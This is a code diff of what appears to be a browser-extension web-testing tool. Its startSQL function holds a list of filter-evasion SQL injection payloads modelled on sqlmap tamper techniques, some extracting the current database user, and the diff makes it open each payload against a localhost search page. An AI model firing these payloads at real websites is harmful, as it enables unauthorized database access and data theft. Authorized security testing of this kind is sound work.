@@ -73,9 +73,9 @@ function fillForm(s){
 //------------------------------------------------------------------------------
 //--------------------The Various Tests Functions-------------------------------
 //------------------------------------------------------------------------------
-function startSQL(iterCount){
+function startSQL(){
 
-        var sqlDatabase = [
+    var sqlDatabase = [
     '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871', // apostrophemask
     '1 AND %00%271%00%27=%00%271', //apostrophenullencode
     '1 AND 1=1%00', // appendnullbyte
@@ -124,13 +124,12 @@ function startSQL(iterCount){
     '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#', //versionedkeywords
     '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#' //versionedmorekeywords
     ];
+    var site1 = "http://localhost:8888/search.php?search=";
+    var test1 = site1.concat(sqlDatabase[0]);
 
-    var site = "http://localhost:8888/search.php?search=";
-    var test = site.concat(sqlDatabase[0]);
-
-    for (var i=1; i<iterCount; i++){
-        chrome.tabs.create({'url': test});
-        test = site.concat(sqlDatabase[i]);
+    for (let i=1; i < sqlDatabase.length; i++){
+        chrome.tabs.create({'url': test1});
+        test1 = site1.concat(sqlDatabase[i]);
 
     }
 
@@ -179,7 +178,7 @@ function startTest(){
 
     //check which radio button is selected
     if(document.getElementById('selectSQL').checked){
-        startSQL(iterations);
+        startSQL();
     }
     else if(document.getElementById('selectCSRF').checked){
         startCSRF();
